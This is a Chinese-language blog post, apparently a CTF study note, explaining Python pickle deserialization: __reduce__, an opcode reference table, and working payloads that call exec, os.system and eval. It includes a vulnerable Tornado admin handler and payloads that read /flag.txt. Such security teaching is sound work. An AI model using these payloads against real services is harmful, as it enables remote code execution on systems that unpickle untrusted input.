@@ -1,0 +1,370 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>初探pickle反序列化 | f4l1k_blog</title><meta name="keywords" content="study"><meta name="author" content="f4l1k"><meta name="copyright" content="f4l1k"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="初探pickle反序列化object.__reduce__函数 在开发时，可以通过重写类的 object.__reduce__() 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 object.__reduce__() 返回一个 (callable, ([para1,para2...])[,...]) 的元组，每当该类的对象被unpickle时，该callable就会被调用以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探pickle反序列化">
+<meta property="og:url" content="http://example.com/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="f4l1k_blog">
+<meta property="og:description" content="初探pickle反序列化object.__reduce__函数 在开发时，可以通过重写类的 object.__reduce__() 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 object.__reduce__() 返回一个 (callable, ([para1,para2...])[,...]) 的元组，每当该类的对象被unpickle时，该callable就会被调用以">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/fire.JPG">
+<meta property="article:published_time" content="2021-10-31T08:31:17.000Z">
+<meta property="article:modified_time" content="2021-10-31T10:02:48.394Z">
+<meta property="article:author" content="f4l1k">
+<meta property="article:tag" content="study">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/fire.JPG"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '初探pickle反序列化',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-10-31 18:02:48'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/konglong.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/fire.JPG')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">f4l1k_blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">初探pickle反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-10-31T10:02:48.394Z" title="Updated 2021-10-31 18:02:48">2021-10-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>6min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="初探pickle反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="初探pickle反序列化"><a href="#初探pickle反序列化" class="headerlink" title="初探pickle反序列化"></a>初探pickle反序列化</h1><h3 id="object-reduce-函数"><a href="#object-reduce-函数" class="headerlink" title="object.__reduce__函数"></a>object.__reduce__函数</h3><ul>
+<li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li>
+<li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的</li>
+</ul>
+<h3 id="picktools"><a href="#picktools" class="headerlink" title="picktools"></a>picktools</h3><p>pictools可以把opcode转化成规范格式，便于观看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">test=<span class="string">b&#x27;\x80\x03c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00testq\x03X\x0b\x00\x00\x00hello worldq\x04sb.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pickletools.dis(test))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5Cimg%5Cimage-pick1.png" alt="image-pick1"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
+<p>变量覆盖</p>
+</blockquote>
+<blockquote>
+<p>代码执行</p>
+</blockquote>
+<h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">test1=<span class="string">b&#x27;hello&#x27;</span></span><br><span class="line">test2=<span class="string">b&#x27;world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        te=<span class="string">&quot;test1=b&#x27;no&#x27;\ntest2=b&#x27;success&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exec</span>,(te,) <span class="comment">#return参数必须为元组</span></span><br><span class="line"></span><br><span class="line">new=Test()</span><br><span class="line">a=pickle.dumps(new)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">pickle.loads(a)</span><br><span class="line"><span class="built_in">print</span>(test1,test2)</span><br></pre></td></tr></table></figure>
+
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rc</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        shell=<span class="string">&quot;echo &#x27;hello world&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> os.system,(shell,)</span><br><span class="line"></span><br><span class="line">a=Rc()</span><br><span class="line">pi=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(pi)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(pi))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="手动编写opcode"><a href="#手动编写opcode" class="headerlink" title="手动编写opcode"></a>手动编写opcode</h3><p>reduce一次只能执行一个函数，当exec被禁，就不能一次执行多个指令</p>
+<table>
+<thead>
+<tr>
+<th>opcode</th>
+<th>描述</th>
+<th>具体写法</th>
+<th>栈上的变化</th>
+<th align="center">memo上的变化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>c</td>
+<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>
+<td>c[module]\n[instance]\n</td>
+<td>获得的对象入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>o</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>o</td>
+<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>i</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>i[module]\n[callable]\n</td>
+<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>N</td>
+<td>实例化一个None</td>
+<td>N</td>
+<td>获得的对象入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>S</td>
+<td>实例化一个字符串对象</td>
+<td>S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
+<td>获得的对象入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>V</td>
+<td>实例化一个UNICODE字符串对象</td>
+<td>Vxxx\n</td>
+<td>获得的对象入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>I</td>
+<td>实例化一个int对象</td>
+<td>Ixxx\n</td>
+<td>获得的对象入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>F</td>
+<td>实例化一个float对象</td>
+<td>Fx.x\n</td>
+<td>获得的对象入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>R</td>
+<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td>R</td>
+<td>函数和参数出栈，函数的返回值入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>.</td>
+<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td>.</td>
+<td>无</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>(</td>
+<td>向栈中压入一个MARK标记</td>
+<td>(</td>
+<td>MARK标记入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>t</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td>t</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>)</td>
+<td>向栈中直接压入一个空元组</td>
+<td>)</td>
+<td>空元组入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>l</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td>l</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>]</td>
+<td>向栈中直接压入一个空列表</td>
+<td>]</td>
+<td>空列表入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>d</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td>d</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>}</td>
+<td>向栈中直接压入一个空字典</td>
+<td>}</td>
+<td>空字典入栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>p</td>
+<td>将栈顶对象储存至memo_n</td>
+<td>pn\n</td>
+<td>无</td>
+<td align="center">对象被储存</td>
+</tr>
+<tr>
+<td>g</td>
+<td>将memo_n的对象压栈</td>
+<td>gn\n</td>
+<td>对象被压栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>0</td>
+<td>丢弃栈顶对象</td>
+<td>0</td>
+<td>栈顶对象被丢弃</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>b</td>
+<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td>b</td>
+<td>栈上第一个元素出栈</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>s</td>
+<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td>s</td>
+<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>u</td>
+<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td>u</td>
+<td>MARK标记以及被组合的数据出栈，字典被更新</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>a</td>
+<td>将栈的第一个元素append到第二个元素(列表)中</td>
+<td>a</td>
+<td>栈顶元素出栈，第二个元素（列表）被更新</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td>e</td>
+<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td>e</td>
+<td>MARK标记以及被组合的数据出栈，列表被更新</td>
+<td align="center">无</td>
+</tr>
+</tbody></table>
+<p>注意：<code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库</p>
+<p>经常使用的<code>R</code> ,<code>O</code>,<code>i</code></p>
+<h4 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,test</span>):</span></span><br><span class="line">        self.test=test</span><br><span class="line">        <span class="built_in">print</span>(self.test)</span><br><span class="line"></span><br><span class="line"><span class="comment">#R</span></span><br><span class="line"><span class="comment"># p=b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="comment"># Test</span></span><br><span class="line"><span class="comment"># (S&#x27;hello&#x27;</span></span><br><span class="line"><span class="comment"># tR.</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#O</span></span><br><span class="line"><span class="comment"># p=b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="comment"># Test</span></span><br><span class="line"><span class="comment"># S&#x27;hello&#x27;</span></span><br><span class="line"><span class="comment"># o.</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#I</span></span><br><span class="line">p=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;hello&#x27;</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">Test</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">he=pickle.loads(p)</span><br><span class="line"><span class="built_in">print</span>(he.test)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="ctf-ikun"><a href="#ctf-ikun" class="headerlink" title="ctf ikun"></a>ctf ikun</h4><p>部分代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h6 id="手写版"><a href="#手写版" class="headerlink" title="手写版"></a>手写版</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">pi=<span class="string">&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">(S&#x27;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(urllib.quote(pi))</span><br></pre></td></tr></table></figure>
+
+<h6 id="代码版"><a href="#代码版" class="headerlink" title="代码版"></a>代码版</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        shell=<span class="string">b&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>,(shell,)</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(AdminHandler()))</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(pickle.dumps(AdminHandler())))</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">f4l1k</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/study/">study</a></div><div class="post_share"><div class="social-share" data-image="/img/fire.JPG" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/"><img class="prev-cover" src="/img/fire.JPG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">ssh隧道</div></div></a></div><div class="next-post pull-right"><a href="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/"><img class="next-cover" src="/img/fire.JPG" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">HXB writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" title="docker和phpstorm搭建php开发环境"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">docker和phpstorm搭建php开发环境</div></div></a></div><div><a href="/2021/10/31/general/isoon/" title="ISOON"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">ISOON</div></div></a></div><div><a href="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="初探java反序列化"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">初探java反序列化</div></div></a></div><div><a href="/2021/10/31/general/ssh%E9%9A%A7%E9%81%93/" title="ssh隧道"><img class="cover" src="/img/fire.JPG" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-31</div><div class="title">ssh隧道</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/konglong.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">f4l1k</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">14</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div></div><a class="button--animated" 